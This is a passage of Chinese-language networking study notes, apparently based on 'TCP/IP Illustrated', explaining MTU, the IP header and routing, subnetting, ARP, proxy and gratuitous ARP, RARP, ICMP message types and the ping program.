<li>点到点的链路层（如SLIP和PPP）和MTU并非指的是网络媒体的物理特性。相反，它是一个逻辑限制，母的是为交互使用提供足够快的响应时间</li>
<li>两台通信主机路径中的最小MTU。它被称作路径MTU</li>
<li>路径MTU在两个方向上不一定是一致的</li>
<li>MTU是计算出方向的</li>
</ul>
<h2 id="串行线路吞吐量计算"><a href="#串行线路吞吐量计算" class="headerlink" title="串行线路吞吐量计算"></a>串行线路吞吐量计算</h2><p>如果线路速率是9600b/s，而一个字节有8bit，加上一个起始比特和一个停止比特，那么线路的速率就是960B/s（字节/秒）。以这个速率传输一个1024字节的分组需要1066ms。如果用SLIP链接运行一个交互式应用程序，同时还运行另一个应用程序如FTP发送或接收1024字节的数据，那么一般来说就必须等待一半的时间（533ms）才能把交互式应用程序的分组数据发送出去。</p>
<p>对于交互应用来说，等待533ms是不能接受的。研究表明，交互响应时间超过100~200ms就被认为是不好的，这是发送一份交互报文出去后，直到接收到响应信息（通常是出现一个回显字符）为止的往返时间。</p>
<p>注意：我们对平均等待时间的计算（传输最大数据帧所需时间的一半）只适用于SLIP链路（或PPP链路）在交互通信和大块数据传输这两种情况下。</p>
<h1 id="IP：网际协议"><a href="#IP：网际协议" class="headerlink" title="IP：网际协议"></a>IP：网际协议</h1><h2 id="IP介绍"><a href="#IP介绍" class="headerlink" title="IP介绍"></a>IP介绍</h2><ul>
<li>IP是TCP/IP协议族中最为核心的协议。所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输</li>
<li>IP提供不可靠、无连接的数据报传送服务</li>
<li>不可靠（unreliable）的意思是它不能保证IP数据报能成功到达目的地。IP仅提供最好的传输服务。如果发生某种错误时，如某个路由器暂时用完了缓冲区，IP有一个简单的错误处理算法：丢弃该数据报，然后发送ICMP消息报给信源端。任何要求的可靠性必须由上层来提供（如TCP）</li>
<li>无连接（connectionless）这个术语的意思是IP并不维护任何关于后续数据报的状态信息。每个数据报的处理是互相独立的。IP数据报可以不按发送顺序接收。如果一信源向相同的信宿发送两个连续的数据报（先是A，然后是B），每个数据报都是独立地进行路由选择，课时选择不同的路线，因此B可能在A到达之前先到达。</li>
</ul>
<h2 id="IP首部"><a href="#IP首部" class="headerlink" title="IP首部"></a>IP首部</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/161409216674369.png" alt=""></p>
<ul>
<li>4个字节的32bit值以下面的次序传输：首先是0~7bit，其次8~15bit，然后16~23bit，最后是24、·31bit。这种传输次序称作big endian字节序。由于TVP|IP首部中所有的二进制整数在网络中传输时都要求以这种次序，因此它又称作网络字节序</li>
<li>目前的协议版本号是4，因此IP有时也称作IPv4</li>
<li>首部长度指的是首部占32bit字的数目，包括任何选项。由于它是一个4bit字段，因此首部最长为60个字节</li>
<li>服务类型（TOS）字段包括一个3bit的优先权子字段（现在已被忽略），4bit的TOS字段和1bit未用位但必须置0</li>
<li>服务类型（TOS）字段包括一个3 bit的优先权子字段（现在已被忽略），4 bit的TOS子字段和1 bit未用位，但必须置0。4 bit的TOS分别代表：最小时延、最大吞吐量、最高可靠性和最小费用。 4 bit中只能置其中1 bit。如果所有4 bit均为0，那么就意味着是一般服务。图3-2列出了对不同应用建议的TOS值。</li>
</ul>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/161438232606801.png" alt=""></p>
<p>注意：现在大多数的TCP/IP实现都不支持TOS特性。</p>
<ul>
<li>总长度字段是指整个IP数据报的长度，以字节为单位。由于该字段长16比特，所以IP数据报最长可达65535字节。<br>注意：尽管可以传送一个长达65535字节的IP数据报，但是大多数的链路层都会对它进行分片。而且，主机也要求不能接收超过576字节的数据报。</li>
<li>标识字段唯一地标识主机发送的每一份数据报。通常每发送一份报文它的值就会加1。</li>
<li>TTL生存时间字段设置了数据报可以经过的最多路由器数。它指定了数据报的生存时间。 TTL的初始值由源主机设置（通常为32或64），一旦经过一个处理它的路由器，它的值就减去1。当该字段的值为0时，数据报就被丢弃，并发送ICMP报文通知源主机。</li>
<li>协议字段，它可以识别是哪个协议向IP传送数据。</li>
<li>首部检验和字段是根据IP首部计算的检验和码。</li>
<li>如果结果不是全1（即检验和错误），那么IP就丢弃收到的数据报。但是不生成差错报文，由上层去发现丢失的数据报并进行重传</li>
<li>由于路由器经常只修改TTL字段（减1），因为当路由器转发一份报文时可以增加它的检验和，而不需要对IP整个首部进行重新计算</li>
<li>任选项，是数据报中的一个可变长的可选信息。这些选项很少被使用，并非所有的主机和路由器都支持这些选项。</li>
</ul>
<h2 id="IP路由选择"><a href="#IP路由选择" class="headerlink" title="IP路由选择"></a>IP路由选择</h2><h3 id="路由表中的包含信息"><a href="#路由表中的包含信息" class="headerlink" title="路由表中的包含信息"></a>路由表中的包含信息</h3><ul>
<li>目的IP地址。<br>它既可以是一个完整的主机地址，也可以是一个网络地址，由该表目中的标志字段来指定。主机地址有一个非0的主机号，以指定某一特定的主机，而网络地址中的主机号为0，以指定网络中的所有主机（如以太网，令牌环网）。</li>
<li>下一跳路由器的IP地址，或者有直接连接的网络IP地址。<br>下一跳路由器是指一个在直接相连网络上的路由器，通过它可以转发数据报。下一跳路由器不是最终的目的，但是它可以把传送给它的数据报转发到最终目的。</li>
<li>标志。<br>其中一个标志指明目的IP地址是网络地址还是主机地址，另一个标志指明下一跳路由器是否为真正的下一跳路由器，还是一个直接相连的接口。</li>
<li>为数据报的传输指定一个网络接口。</li>
</ul>
<h3 id="路由选择完成的功能"><a href="#路由选择完成的功能" class="headerlink" title="路由选择完成的功能"></a>路由选择完成的功能</h3><p>IP路由选择是逐跳地进行的。IP并不知道到达任何目的的完整路径（当然，除了那些与主机直接相连的目的）。所有的IP路由选择只为数据报传输提供下一跳路由器的IP地址。它假定下一跳路由器比发送数据报的主机更接近目的，而且下一跳路由器与该主机是直接相连的。</p>
<ul>
<li>搜索路由表，寻找能与目的IP地址完全匹配的表目（网络号和主机号都要匹配）。如果找到，则把报文发送给该表目指定的下一站路由器或直接连接的网络接口（取决于标志字段的值）。</li>
<li>搜索路由表，寻找能与目的网络号相匹配的表目。如果找到，则把报文发送给该表目指定的下一站路由器或直接连接的网络接口。</li>
<li>搜索路由表，寻找标为“默认”的表目。如果找到，则把报文发送给该表目指定的下一站路由器</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="http://news.edu-chn.com/newsadmin/upload_images/1115277097522.JPG" alt=""></p>
<p><img src="http://news.edu-chn.com/newsadmin/upload_images/1115277119522.JPG" alt=""></p>
<p>对于这个例子需要指出一些关键点：</p>
<ul>
<li>该例子中所有主机和路由器都使用了默认路由。事实上，大多数主机和一些路由器可以用默认路由来处理任何目的，除非它在本地局域网上</li>
<li>数据报中的目的IP地址始终不发生任何变化。所有的路由选择决策都是基于这个目的IP地址</li>
<li>每个链路层可能具有不同数据帧首部，而且链路层的目的地址（如果有的话）始终指的是下一站的链路层地址。在例子中，两个以太网封装了含有下一站以太网地址的链路层首部，但是SLIP链路没有这样做。以太网地址一般通过ARP获得。</li>
</ul>
<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>任何主机在引导时进行的部分配置是指定主机IP地址。除了此以外，还需要知道有多少比特用于子网号和多少比特用于主机号。这是在引导过程中通过子网掩码来确定的。子网掩码是一个32 bit的值，其中值为1的比特留给网络号和子网号，为0的比特留给主机号。</p>
<p>例如：一个B类地址的两种不同的子网掩码格式。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/171403295891545.png" alt=""></p>
<p>第一个例子，子网号和主机号都是8 bit。第二个例子，子网号是10 bit，主机号是6 bit。</p>
<h2 id="特殊情况的IP地址"><a href="#特殊情况的IP地址" class="headerlink" title="特殊情况的IP地址"></a>特殊情况的IP地址</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/171404494796569.png" alt=""></p>
<ul>
<li>0表示所有的比特位全为0；-1表示所有的比特位全为1；netid、subnetid和hostid分别表示不为全0或全1的对应字段。子网号栏为空表示该地址没有进行子网划分</li>
<li>表的头两项是特殊的源地址，中间是特殊的环回地址，最后四项是广播地址</li>
<li>表中的头两项，网络号为0，如主机使用BOOTP协议确定本机IP地址时只能作为初始化过程中的源地址出现</li>
</ul>
<h1 id="ARP：地址解析协议"><a href="#ARP：地址解析协议" class="headerlink" title="ARP：地址解析协议"></a>ARP：地址解析协议</h1><h2 id="ARP介绍"><a href="#ARP介绍" class="headerlink" title="ARP介绍"></a>ARP介绍</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/182021092763762.png" alt=""></p>
<ul>
<li>当一台主机把以太网数据帧发送到位于同一局域网上的另一台主机时，是根据48bit的以太网地址来确定目的接口的。设备驱动程序从不检查IP数据报中的目的IP地址</li>
<li>地址解析为这两种不同的地址形式提供映射：32bit的IP地址和数据链路层使用的任何类型的地址（FR环境）</li>
<li>ARP为IP地址到对应的硬件地址之间提供动态映射。我们之所以用动态这个词是因为这个过程是自动完成的，一般应用程序用户或系统管理员不必关心</li>
<li>RARP是被那些没有磁盘驱动器的系统使用（一般是无盘工作站或X终端），它需要系统管理员进行手工设置</li>
</ul>
<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/182028596987012.png" alt=""></p>
<p>当敲入以下命令时：ftp bsdi（主机名），会发生下列步骤：</p>
<ul>
<li>应用程序FTP客户端调用函数gethostbyname把主机名（bsdi）转换成32 bit的IP地址。这个转换过程或者使用DNS，或者在较小网络中使用一个静态的主机文件（/etc/hosts）。</li>
<li>FTP客户端请求TCP用得到的IP地址建立连接。</li>
<li>TCP发送一个连接请求分段到远端的主机，即用上述IP地址发送一份IP数据报。</li>
<li>如果目的主机在本地网络上（如以太网、令牌环网或点对点链接的另一端），那么IP数据报可以直接送到目的主机上。如果目的主机在一个远程网络上，就通过IP选路函数来确定位于本地网络上的下一站路由器地址，并让它转发IP数据报。</li>
<li>假定是一个以太网，那么发送端主机必须把32 bit的IP地址变换成48 bit的以太网地址。从逻辑Internet地址到对应的物理硬件地址需要进行翻译，这是ARP的功能。</li>
<li>ARP发送一份称作ARP请求的以太网数据帧给以太网上的每个主机，这个过程称作广播。ARP请求数据帧中包含目的主机的IP地址（主机名为bsdi），意思是“如果你是这个IP地址的拥有者，请回答你的硬件地址。”</li>
<li>目的主机的ARP层收到这份广播报文后，识别出这是发送端在寻问它的IP地址，于是发送一个ARP应答。这个ARP应答包含IP地址及对应的硬件地址。</li>
<li>收到ARP应答后，使ARP进行请求-应答交换的IP数据报现在就可以传送了。</li>
<li>发送IP数据报到目的主机。</li>
</ul>
<p>说明：</p>
<ul>
<li>在ARP背后有一个基本概念，就是网络接口有一个硬件地址（一个48 bit的值，标识不同的以太网或令牌环网络接口）。</li>
<li>在硬件层次上进行的数据帧交换必须有正确的接口地址。但是，TCP/IP有自己的地址：32 bit的IP地址。知道主机的IP地址并不能让内核发送一帧数据给主机。内核（如以太网驱动程序）必须知道目的端的硬件地址才能发送数据。</li>
<li>ARP的功能是在32 bit的IP地址和采用不同网络技术的硬件地址之间提供动态映射。</li>
<li>点对点链路不使用ARP。当设置这些链路时（一般在引导过程进行），必须告知内核链路每一端的IP地址。像以太网地址这样的硬件地址并不涉及。</li>
</ul>
<h2 id="ARP背后的一个基本概念"><a href="#ARP背后的一个基本概念" class="headerlink" title="ARP背后的一个基本概念"></a>ARP背后的一个基本概念</h2><ul>
<li>在ARP背后有一个概念，那就是网络接口有一个硬件地址（一个48bit的值，标识不同的以太网或令牌环网络接口）。在硬件层次上进行的数据帧交换必须有正确的接口地址。但是，TCP|IP有自己的地址：32bit的IP地址。知道主机的IP地址并不能让内核发送一帧数据给主机。内核必须知道目的端的硬件地址才能发送数据。ARP的功能是在32bit的IP地址和采用不同网络技术的硬件地址之间提供动态映射</li>
<li>点对点链路不好使用ARP。当设置这些链路时（一般在引导过程进行），必须告知内核链路每一端IP的地址。像以太网地址这样的硬件地址并不涉及</li>
</ul>
<h2 id="ARP高速缓存"><a href="#ARP高速缓存" class="headerlink" title="ARP高速缓存"></a>ARP高速缓存</h2><ul>
<li>ARP高效运行的关键是由于每个主机上都有一个ARP高速缓存。这个高速缓存存放了最近Intern et地址到硬件地址之间的映射记录。高速缓存中每一项的生存时间一般为20分钟，起始时间从被创建时开始算起。</li>
<li>可用arp命令来检查ARP高速缓存。-a的意思是显示高速缓存中所有的内容。</li>
<li>48 bit的以太网地址用6个十六进制的数来表示，中间以冒号隔开。</li>
</ul>
<h3 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">arp -a	查看缓存</div><div class="line">arp -d  清除缓存</div></pre></td></tr></table></figure>
<h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">show arp	查看缓存</div><div class="line">clear arp	清除缓存</div></pre></td></tr></table></figure>
<h2 id="ARP的分组格式"><a href="#ARP的分组格式" class="headerlink" title="ARP的分组格式"></a>ARP的分组格式</h2><p>在以太网上解析IP地址时，ARP请求和应答分组的格式如图4-3所示（ARP可以用于其他类型的网络，可以解析IP地址以外的地址。紧跟着帧类型字段的前四个字段指定了最后四个字段的类型和长度）</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/182051571674088.png" alt=""></p>
<h3 id="ARP包字段分析"><a href="#ARP包字段分析" class="headerlink" title="ARP包字段分析"></a>ARP包字段分析</h3><ul>
<li>前两个字段是以太网的源地址和目的地址。目的地址为全1的地址是广播地址。电缆上的所有以太网接口都要接收广播的数据帧。</li>
<li>以太网帧类型表示后面数据的类型。对于ARP请求或应答来说，该字段的值为0x0806。</li>
<li>硬件类型字段表示硬件地址的类型。它的值为1即表示以太网地址。</li>
<li>协议类型字段表示要映射的协议地址类型。它的值为0x0800即表示IP地址。</li>
<li>硬件地址长度和协议地址长度分别指出硬件地址和协议地址的长度，以字节为单位。对于以太网上IP地址的ARP请求或应答来说，它们的值分别为6和4。</li>
<li>操作字段指出四种操作类型，它们是ARP请求（值为1）、ARP应答（值为2）、RARP请求（值为 3）和RARP应答（值为4）。</li>
</ul>
<h2 id="ARP代理"><a href="#ARP代理" class="headerlink" title="ARP代理"></a>ARP代理</h2><p>ARP代理通俗地说，就是由中间设备代替其他主机响应arp请求。下图展现了ARP代理工作的主要过程：<br>Proxy ARP应该使用主机没有配置默认网关或没有任何路由策略的网络上</p>
<p><img src="http://www.vants.org/content/plugins/kl_album/upload/201209/98e326f50f0ae0ca8723ba653376c7c020120914093556873290427.png" alt=""></p>
<h3 id="ARP代理工作的过程说明"><a href="#ARP代理工作的过程说明" class="headerlink" title="ARP代理工作的过程说明"></a>ARP代理工作的过程说明</h3><ul>
<li>192.168.0.16/16主机向外发送目的主机为192.168.1.3/24的ARP请求报文；</li>
<li>网关收到0.16的ARP请求报文，由于网关开启了ARP代理的功能，因此网关代替1.3向0.16发送ARP响应数据报；</li>
<li>网关向1.0/24网段发送1.3的ARP请求报文；</li>
<li>1.3收到后，发送ARP响应报文。</li>
</ul>
<h3 id="ARP代理带来的问题"><a href="#ARP代理带来的问题" class="headerlink" title="ARP代理带来的问题"></a>ARP代理带来的问题</h3><p>在开启ARP代理功能之后，很可能会导致地址冲突等类似故障的产生，如在下图的网络环境下，将会产生一系列的不稳定的故障现象产生。 </p>
<p><img src="http://www.vants.org/content/plugins/kl_album/upload/201209/726cb8dcdc4764f2cc1559c89ffde637201209161035261080797373.png" alt=""></p>
<p>   正因为如此，我们在实际工作的环境中对于ARP代理功能的应用需要慎重一些，尽量避免针对整个网段使用ARP代理功能，最好只针对需要使用ARP代理功能来实现某些特殊功能需求的少数IP开启。</p>
<h3 id="ARP代理在实际工作中的应用"><a href="#ARP代理在实际工作中的应用" class="headerlink" title="ARP代理在实际工作中的应用"></a>ARP代理在实际工作中的应用</h3><h4 id="AnyIP"><a href="#AnyIP" class="headerlink" title="AnyIP"></a>AnyIP</h4><p>AnyIP是指机器随便使用什么IP地址或网关信息，只要接入网络中都可以实现访问的需求。这个技术被广泛的应用在soho级网关产品中，特别是在宾馆、会议室、广场等公共场所，为网络使用者提供了很大的便利。<br>其工作原理就是利用了ARP代理的功能，在收到非本地IP地址的ARP请求报文时，对其进行ARP响应。这样，那些收到ARP响应的主机就会将相关的数据包发送至网关设备接口处，再由网关设备转发出去，从而实现了上网的功能。   </p>
<h4 id="网关地址映射"><a href="#网关地址映射" class="headerlink" title="网关地址映射"></a>网关地址映射</h4><p>在很多网关设备上，都支持将内网的服务器映射为公网地址对外提供服务，以达到隐藏内部网络的目的，这种地址映射也是利用ARP代理技术来实现的，我们来简单看一下下图所示的地址映射的工作过程： </p>
<p><img src="http://www.vants.org/content/plugins/kl_album/upload/201209/d8007e7cdb19d6455234a654b47ab31b2012091409355588821205.png" alt=""></p>
<p>  在这个过程中，当来自互联网的数据访问产生了对映射外网地址202.102.X.2的ARP请求报文，正常情况下，因为这个地址的真实主机并不存在，发送端是不会收到来自202.102.X.2的ARP响应报文的。但是，由于网关上启用了针对202.102.X.2的ARP代理功能，网关会替代202.102.X.2发送ARP响应报文。从而实现了地址映射访问的需求。</p>
<h2 id="免费ARP"><a href="#免费ARP" class="headerlink" title="免费ARP"></a>免费ARP</h2><p>它是指主机发送ARP查找自己的IP地址。通常，它发生在系统引导期间进行接口配置的时候。免费ARP有两个作用：</p>
<ul>
<li>一个主机可以通过它来确定另一个主机是否设置了相同的IP地址。主机bsdi并不希望对此请求有一个回答。但是，如果收到一个回答，那么就会在终端日志上产生一个错误信息“以太网：a:b:c:d:e:f发送来重复的IP地址”。这样就可以警告系统管理员，某个系统有不正确的设置。</li>
<li>如果发送免费ARP的主机正好改变了硬件地址（很可能是主机关机了，并换了一块接口卡，然后重新启动），那么这个分组就可以使其他主机高速缓存中旧的硬件地址进行相应的更新。一个比较著名的ARP协议事实是，如果主机收到某个IP地址ARP请求，而且它已经在接收者的高速缓存中，那么就要用ARP请求中的发送端硬件地址（如以太网地址）对高速缓存中相应的内容进行更新。主机接收到任何ARP请求都要完成这个操作（ARP请求是在网上广播的，因此每次发送ARP请求时网络上的所有主机都要这样做）</li>
<li>通过发送含有备份硬件地址和故障服务器的IP地址的免费ARP请求，使得备份文件服务器可以顺利地接替故障服务器进行工作。这使得所有目的地为故障服务器的报文都被送到备份服务器那里，客户程序不用关心原来的服务器是否出了故障</li>
</ul>
<h1 id="RARP：逆地址解析协议"><a href="#RARP：逆地址解析协议" class="headerlink" title="RARP：逆地址解析协议"></a>RARP：逆地址解析协议</h1><h2 id="引言-1"><a href="#引言-1" class="headerlink" title="引言"></a>引言</h2><p>具有本地磁盘的系统引导时，一般是从磁盘上的配置文件中读取IP地址。但是无盘机，如X终端或无盘工作站，则需要采用其他方法来获得IP地址。<br>网络上的每个系统都具有唯一的硬件地址，它是由网络接口生产厂家配置的。无盘系统的RARP实现过程是从接口卡上读取唯一的硬件地址，然后发送一份RARP请求（一帧在网络上广播的数据），请求某个主机响应该无盘系统的IP地址（在RARP应答中）。</p>
<h2 id="RARP的分组格式"><a href="#RARP的分组格式" class="headerlink" title="RARP的分组格式"></a>RARP的分组格式</h2><p>RARP分组的格式与ARP分组基本一致。它们之间主要的差别是RARP请求或应答的帧类型代码为0x8035，且RARP请求的操作代码为3，应答操作代码为4。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/192207023854764.png" alt=""></p>
<p>注意：RARP请求以广播方式传送，应答一般是单播(unicast)传送的。</p>
<h2 id="RARP服务器的设计"><a href="#RARP服务器的设计" class="headerlink" title="RARP服务器的设计"></a>RARP服务器的设计</h2><p>RARP在概念上很简单，但是一个RARP服务器的设计与系统相关而且比较复杂。相反，提供一个ARP服务器很简单，通常是TCP/IP在内核中实现的一部分。由于内核知道IP地址和硬件地址，因此当它收到一个询问IP地址的ARP请求时，只需用相应的硬件地址来提供应答就可以了。</p>
<h3 id="作为用户进程的RARP服务器"><a href="#作为用户进程的RARP服务器" class="headerlink" title="作为用户进程的RARP服务器"></a>作为用户进程的RARP服务器</h3><p>RARP服务器的复杂性在于：</p>
<ul>
<li>服务器一般要为多个主机（网络上所有的无盘系统）提供硬件地址到IP地址的映射，该映射包含在一个磁盘文件中。由于内核一般不读取和分析磁盘文件，因此RARP服务器的功能就由用户进程来提供，而不是作为内核的TCP/IP实现的一部分。</li>
<li>RARP请求是作为一个特殊类型的以太网数据帧来传送的（帧类型字段值为0x8035），说明RARP服务器必须能够发送和接收这种类型的以太网数据帧。</li>
</ul>
<h3 id="每个网络有多个RARP服务器"><a href="#每个网络有多个RARP服务器" class="headerlink" title="每个网络有多个RARP服务器"></a>每个网络有多个RARP服务器</h3><p>RARP服务器实现的一个复杂因素是RARP请求是在硬件层上进行广播的，这意味着它们不经过路由器进行转发。为了让无盘系统在RARP服务器关机的状态下也能引导，通常在一个网络上（例如一根电缆）要提供多个RARP服务器。<br>当服务器的数目增加时（以提供冗余备份），网络流量也随之增加，因为每个服务器对每个RARP请求都要发送RARP应答。发送RARP请求的无盘系统一般采用最先收到的RARP应答。（对于ARP，只有一台主机发送ARP应答）。每个RARP服务器同时应答，这样会增加以太网发生冲突的概率。</p>
<h1 id="ICMP：Internet控制报文协议"><a href="#ICMP：Internet控制报文协议" class="headerlink" title="ICMP：Internet控制报文协议"></a>ICMP：Internet控制报文协议</h1><h2 id="ICMP介绍"><a href="#ICMP介绍" class="headerlink" title="ICMP介绍"></a>ICMP介绍</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/201851308717804.png" alt=""><br><img src="http://images.cnitblog.com/blog2015/697266/201504/201854533243954.png" alt=""></p>
<ul>
<li>ICMP经常被认为是IP层的一个组成部分。它传递差错报文以及其他需要注意的信息。ICMP报文通常被IP层或更高层协议（TCO或UDP）使用。一些ICMP报文把差错报文返回给用户进程</li>
<li>ICMP报文是在IP数据内部被传输的</li>
<li>ICMP报文的格式如图6-2所示。所有报文的前4个字节都是一样的，但是剩下的其他字节则互不相同</li>
<li>类型字段可以有15个不同的值，以描述特定类型的ICMP报文。某些ICMP报文还使用代码字段的值来进一步描述不同的条件</li>
<li>检验和字段覆盖整个ICMP报文。使用的算法与IP首部检验和算法相同。ICMP的检验和是必须的</li>
</ul>
<h2 id="ICMP报文的类型"><a href="#ICMP报文的类型" class="headerlink" title="ICMP报文的类型"></a>ICMP报文的类型</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/201900206052867.png" alt=""></p>
<ul>
<li>不同类型由报文中的类型字段和代码字段来共同决定。</li>
<li>ICMP是一份查询报文还是一份差错报文。</li>
<li>因为对ICMP差错报文有时需要作特殊处理，因此需要对它们进行区分。例如，在对ICMP差错报文进行响应时，永远不会生成另一份ICMP差错报文（如果没有这个限制规则，可能会遇到一个差错产生另一个差错的情况，而差错再产生差错，这样会无休止地循环下去）。</li>
<li>当发送一份ICMP差错报文时，报文始终包含IP的首部和产生ICMP差错报文的IP数据报的前8个字节。这样，接收ICMP差错报文的模块就会把它与某个特定的协议（根据IP数据报首部中的协议字段来判断）和用户进程（根据包含在IP数据报前8个字节中的TCP或UDP报文首部中的TCP或UDP端口号来判断）联系起来。</li>
</ul>
<h3 id="下面各种情况都不会导致产生ICMP差错报文"><a href="#下面各种情况都不会导致产生ICMP差错报文" class="headerlink" title="下面各种情况都不会导致产生ICMP差错报文"></a>下面各种情况都不会导致产生ICMP差错报文</h3><ul>
<li>ICMP差错报文（ICMP查询报文可能会产生ICMP差错报文）。</li>
<li>目的地址是广播地址或多播地址的IP数据报。</li>
<li>作为链路层广播的数据报。</li>
<li>不是IP分片的第一片。</li>
<li>源地址不是单个主机的数据报。即源地址不能为零地址、环回地址、广播地址或多播地址。</li>
</ul>
<p>这些规则是为了防止过去允许ICMP差错报文对广播分组响应所带来的广播风暴。</p>
<h2 id="ICMP地址掩码请求与应答"><a href="#ICMP地址掩码请求与应答" class="headerlink" title="ICMP地址掩码请求与应答"></a>ICMP地址掩码请求与应答</h2><p>ICMP地址掩码请求用于无盘系统在引导过程中获取自己的子网掩码。系统广播它的ICMP请求报文，报文格式如图6-4所示：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/201922374028201.png" alt=""></p>
<p>说明：</p>
<ul>
<li>标识符和序列号字段由发送端任意选择设定，这些值在应答中将被返回。这样，发送端就可以把应答与请求进行匹配。</li>
<li>广播的定义是指局域网上的所有主机，因此它必须包括发送主机在内。当以太网驱动程序识别出目的地址是广播地址后，它就把分组送到网络上，同时传一份拷贝到环回接口。</li>
<li>通常，应答地址必须是单播地址，除非请求端的源IP地址是0.0.0.0。</li>
</ul>
<h3 id="ICMP时间戳请求与应答"><a href="#ICMP时间戳请求与应答" class="headerlink" title="ICMP时间戳请求与应答"></a>ICMP时间戳请求与应答</h3><p>ICMP时间戳请求允许系统向另一个系统查询当前的时间。返回的建议值是自午夜开始计算的毫秒数，协调的统一时间(Coordinated Universal Time, UTC)。</p>
<p>说明：</p>
<ul>
<li>这种报文的好处是：提供了毫秒级的分辨率，而利用其他方法从别的主机获取的时间（如某些Unix系统提供的rdate命令）只能提供秒级的分辨率。</li>
<li>缺陷是：返回的时间是从午夜开始计算的，因此调用者必须通过其他方法获知当时的日期。</li>
</ul>
<p>ICMP时间戳请求和应答报文格式如图6-6所示：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/201955518555818.png" alt=""></p>
<p>请求端填写发起时间戳，然后发送报文。应答系统收到请求报文时填写接收时间戳，在发送应答时填写发送时间戳。</p>
<h2 id="ICMP端口不可达差错"><a href="#ICMP端口不可达差错" class="headerlink" title="ICMP端口不可达差错"></a>ICMP端口不可达差错</h2><p>端口不可达报文是一种ICMP差错报文，它是ICMP目的不可到达报文中的一种。ICMP不可达报文的一般格式如图6-10所示。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/202037158396912.png" alt=""></p>
<p>说明：</p>
<ul>
<li>ICMP的一个规则是：ICMP差错报文必须包括生成该差错报文的数据报IP首部（包含任何选项），还必须至少包括跟在该IP首部后面的前8个字节。</li>
<li>导致差错的数据报中的IP首部要被送回的原因是因为IP首部中包含了协议字段，使得ICMP可以知道如何解释后面的8个字节。TCP和UDP首部的前8个字节包括源端口和目的端口。</li>
</ul>
<p>ICMP覆盖的范围很广，从致命差错到信息差错，即使在一个给定的系统实现中，对每个ICMP报文的处理都是不相同的。</p>
<h2 id="ICMP报文的4-4BSD处理"><a href="#ICMP报文的4-4BSD处理" class="headerlink" title="ICMP报文的4.4BSD处理"></a>ICMP报文的4.4BSD处理</h2><p>由于ICMP覆盖的范围很广，从致命差错到信息差错，因此即使在一个给定的系统实现中，对每个ICMP报文的处理都是不相同的。<br><img src="http://img.blog.csdn.net/20150414163431439" alt=""></p>
<ul>
<li>如果最后一列标明是“内核”，那么ICMP就由内核来处理</li>
<li>如果最后一列指明是“用户进程”，那么报文就被传送到所有在内核中登记用户进程，以读取收到的ICMP报文</li>
<li>如果不存在任何这样的用户进程，那么报文就悄悄地被丢弃（这些用户进程还会收到所有其它类型的ICMP报文的拷贝，虽然它们应该由内核来处理，当然用户进程只有在内核处理以后才能收到这些报文）。有一些报文完全被忽略</li>
<li>如果最后一列标明的是引号内的一串字符，那么它就是对应的Unix差错。</li>
</ul>
<h1 id="Ping程序"><a href="#Ping程序" class="headerlink" title="Ping程序"></a>Ping程序</h1><h2 id="Ping介绍"><a href="#Ping介绍" class="headerlink" title="Ping介绍"></a>Ping介绍</h2><ul>
<li>“ping”这个名字源于声纳定位操作。Ping程序由Mike Muuss编写，目的是为了测试另一台主机是否可达。该程序发送一份ICMP回显请求报文给主机，并等待返回ICMP回显应答</li>
<li>可以用Ping程序来确定问题出在哪里。Ping程序还能测出到这台主机的往返时间，以表明该主机离我们有多远</li>
<li>一台主机的可达性可能不只取决于IP层是否可达，还取决于使用何种协议以及端口号。Ping程序的运行结果可能显示某台主机不可达，但我们可以用Telnet远程登录到该台主机是25号端口</li>
</ul>
<h2 id="Ping程序-1"><a href="#Ping程序-1" class="headerlink" title="Ping程序"></a>Ping程序</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow4.jpg" alt=""></p>
<ul>
<li>称发送回显请求的ping程序为客户，而称被ping的主机为服务器。大多数的TCP|IP实现都在内核中直接支持Ping服务器–这种服务器不是一个用户进程</li>
<li>对于其他类型的ICMP查询报文，服务器应该响应标识符和序列号字段。另外，客户发送的选项数据必须回显，假设客户对这些信息都会感兴趣</li>
<li>Unix系统在实现ping程序时是把ICMP报文中的标识符字段置成发送进程的ID号。这样即使在同一台主机上同时运行了多个ping程序实例，ping程序也可以识别出返回的信息</li>
<li>在windows下，不管开多个窗口ping的identifier都是相同的，而且每增加一个出去的ping包序列号增加256</li>
</ul>
<h2 id="IP记录路由选项"><a href="#IP记录路由选项" class="headerlink" title="IP记录路由选项"></a>IP记录路由选项</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow5.jpg" alt=""></p>
<ul>
<li>大多数不同版本的ping程序都提供-R选项，以提供记录路由的功能。它使得[ing程序在发送出来的IP数据报中设置IPRR选项（该IP数据报包含ICMP回显请求报文）。这样，每个处理该数据报的路由器都把它的IP地址放入选项字段中。当数据报到达目的端时，IP地址清单应该赋值到ICMP回显应答中，这样返回途中所经过的路由器地址也被加入清单中。当Ping程序收到回显应答时，它就打印出这份IP地址清单</li>
